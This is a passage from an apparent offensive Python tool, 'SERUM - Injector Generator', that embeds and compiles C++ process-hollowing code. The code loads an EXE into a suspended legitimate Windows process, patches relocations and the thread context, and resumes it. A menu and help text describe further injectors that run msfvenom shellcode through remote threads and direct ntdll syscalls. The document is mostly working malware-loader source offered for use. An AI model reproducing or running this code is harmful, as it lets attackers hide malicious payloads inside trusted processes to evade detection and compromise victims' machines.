        for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
        {{
            const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
            if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
                lpImageRelocSection = lpImageSectionHeader;

            const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);

        }}

        DWORD RelocOffset = 0;

        while (RelocOffset < ImageDataReloc.Size)
        {{
            const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
            RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
            const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
            for (DWORD i = 0; i < NumberOfEntries; i++)
            {{
                const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
                RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

                if (lpImageRelocationEntry->Type == 0)
                    continue;

                const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
                DWORD PatchedAddress = 0;

                ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

                PatchedAddress += DeltaImageBase;

                WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

            }}
        }}
        WOW64_CONTEXT CTX = {{}};
        CTX.ContextFlags = CONTEXT_FULL;

        const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);

        const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpAllocAddress, sizeof(DWORD), nullptr);

        CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

        const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);

        ResumeThread(lpPI->hThread);

        return TRUE;
    }}
    BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
    {{
        LPVOID lpAllocAddress;

        const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
        const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

        lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        const DWORD64 DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader64->OptionalHeader.ImageBase;
        lpImageNTHeader64->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
        const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
        const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress64(lpImage);
        PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;
        for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
        {{
            const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
            if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
                lpImageRelocSection = lpImageSectionHeader;
            const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
        }}
        DWORD RelocOffset = 0;
        while (RelocOffset < ImageDataReloc.Size)
        {{
            const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
            RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
            const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
            for (DWORD i = 0; i < NumberOfEntries; i++)
            {{
                const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
                RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

                if (lpImageRelocationEntry->Type == 0)
                    continue;

                const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
                DWORD64 PatchedAddress = 0;

                ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

                PatchedAddress += DeltaImageBase;

                WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

            }}
        }}
        CONTEXT CTX = {{}};
        CTX.ContextFlags = CONTEXT_FULL;
        const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
        const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
        CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;
        const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
        ResumeThread(lpPI->hThread);
        return TRUE;
    }}

    int main()
    {{
        char lpSourceImage[] = "{exe}";
        char lpTargetProcess[] = "{process}";
        const LPVOID hFileContent = GetFileContent(lpSourceImage);
        if (hFileContent == nullptr)
            return -1;
        const BOOL bPE = IsValidPE(hFileContent);
        STARTUPINFOA SI;
        PROCESS_INFORMATION PI;
        ZeroMemory(&SI, sizeof(SI));
        SI.cb = sizeof(SI);
        ZeroMemory(&PI, sizeof(PI));
        const BOOL bProcessCreation = CreateProcessA(lpTargetProcess, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI);
        BOOL bTarget32;
        IsWow64Process(PI.hProcess, &bTarget32);
        ProcessAddressInformation ProcessAddressInformation = {{ nullptr, nullptr }};
        if (bTarget32)
        {{
            ProcessAddressInformation = GetProcessAddressInformation32(&PI);
            if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
            {{
                CleanAndExitProcess(&PI, hFileContent);
                return -1;
            }}
        }}
        else
        {{
            ProcessAddressInformation = GetProcessAddressInformation64(&PI);
            if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
            {{
                CleanAndExitProcess(&PI, hFileContent);
                return -1;
            }}
        }}
        const BOOL bSource32 = IsPE32(hFileContent);

        DWORD dwSourceSubsystem;
        if (bSource32)
            dwSourceSubsystem = GetSubsytem32(hFileContent);
        else
            dwSourceSubsystem = GetSubsytem64(hFileContent);
        DWORD dwTargetSubsystem;
        if (bTarget32)
            dwTargetSubsystem = GetSubsystemEx32(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
        else
            dwTargetSubsystem = GetSubsystemEx64(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);

        BOOL bHasReloc;
        if (bSource32)
            bHasReloc = HasRelocation32(hFileContent);
        else
            bHasReloc = HasRelocation64(hFileContent);

        if (bSource32 && bHasReloc)
        {{
            if (RunPEReloc32(&PI, hFileContent))
            {{
                CleanProcess(&PI, hFileContent);
                return 0;
            }}
        }}
        if (!bSource32 && !bHasReloc)
        {{
            if (RunPE64(&PI, hFileContent))
            {{
                CleanProcess(&PI, hFileContent);
                return 0;
            }}
        }}

        if (!bSource32 && bHasReloc)
        {{
            if (RunPEReloc64(&PI, hFileContent))
            {{
                CleanProcess(&PI, hFileContent);
                return 0;
            }}
        }}
        if (hFileContent != nullptr)
            HeapFree(GetProcessHeap(), 0, hFileContent);

        if (PI.hThread != nullptr)
            CloseHandle(PI.hThread);

        if (PI.hProcess != nullptr)
        {{
            TerminateProcess(PI.hProcess, -1);
            CloseHandle(PI.hProcess);
        }}
        return -1;
    }}
    """

    # Combine all parts into a single variable
    memory_injector = memory_injector_part1 + memory_injector_part2

    # Write the payload to a C file
    with open("payload.c", "w") as file:
        file.write(memory_injector)

    print(f"{Fore.GREEN}[+]{Fore.RESET} Process Hollowing code has been generated succesfully")

    # Compile the C file using MinGW-w64
    os.system("x86_64-w64-mingw32-g++ -o payload.exe payload.c -lntdll -lkernel32 -luser32 -mwindows")

    print(f"{Fore.GREEN}[+]{Fore.RESET} Process Hollowing code has been compiled succesfully")

def main():
    menu()
    option()

def option():
    choice = int(input("serum> Enter your choice: "))
    if choice == 1:
        type = input("serum> Choose type of injector to generate: ")
        if type == "Process Hollowing":
            exe = input("serum> Enter path to exe: ")
            process = input("serum> Enter path to process (eg: c:\\\\windows\\\\system32\\\\notepad.exe): ")
            code_gen2(exe, process)
        else:
            code_gen(type)
    elif choice == 2:
        help()
    elif choice == 3:
        print("Exiting...")
        sys.exit()
        

        
PURPLE = "\033[38;5;93m"
def menu():
    ascii_banner = f"""{PURPLE}
                                                            
    ███████╗███████╗██████╗ ██╗   ██╗███╗   ███╗     
    ██╔════╝██╔════╝██╔══██╗██║   ██║████╗ ████║     
    ███████╗█████╗  ██████╔╝██║   ██║██╔████╔██║     
    ╚════██║██╔══╝  ██╔══██╗██║   ██║██║╚██╔╝██║      
    ███████║███████╗██║  ██║╚██████╔╝██║ ╚═╝ ██║     
    ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝   

═══════════════════════════════════════════════════{Fore.RESET}
          SERUM - Injector Generator{PURPLE}
═══════════════════════════════════════════════════{Fore.RESET}
  {PURPLE}[{Fore.RESET}1{PURPLE}] =={PURPLE}>{Fore.RESET} Generate New Injector
  {PURPLE}[{Fore.RESET}2{PURPLE}] =={PURPLE}>{Fore.RESET} Help
  {PURPLE}[{Fore.RESET}3{PURPLE}] =={PURPLE}>{Fore.RESET} Exit{PURPLE}
═══════════════════════════════════════════════════{Fore.RESET}    
                 
"""

    print(ascii_banner)

def help():
    help_text = """
===============================
      Serum Injector Help
===============================

Serum allows you to generate different types of injectors for executing shellcode.
Below are the available injector types and their options.

-----------------------------------
1️ Thread Creation
-----------------------------------
   - **Description**: Allocates memory in the process, writes shellcode, and starts a new thread to execute it.
   - **Shellcode Input**: Requires a valid msfvenom command to generate shellcode.
   - **Function Types**:
       - `WinApi` → Uses Windows API functions like `CreateThread`
       - `ntdll`  → Uses direct syscalls via `NtAllocateVirtualMemory` & `NtCreateThreadEx`

-----------------------------------
2️ Process Injection
-----------------------------------
   - **Description**: Opens a handle to a running process, injects shellcode into its memory, and executes it remotely.
   - **Shellcode Input**: Requires a valid msfvenom command to generate shellcode.
   - **Process Input**: Requires the **Process ID (PID)** of the target process.
   - **Function Types**:
       - `WinApi` → Uses `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`
       - `ntdll`  → Uses `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`

-----------------------------------
3️ Process Hollowing
-----------------------------------
   - **Description**: Creates a suspended process, replaces its memory with an EXE, and resumes execution.
   - **EXE Input**: Requires the **path to an EXE** file that will be injected.
   - **Process Input**: Requires the **path to a legitimate Windows process** that will be hollowed (e.g., `C:\\Windows\\System32\\notepad.exe`).

To use an injector effectively, ensure the payload and process selection align with your system's architecture (x86/x64).
More features will be added soon
"""

    print(help_text)

main()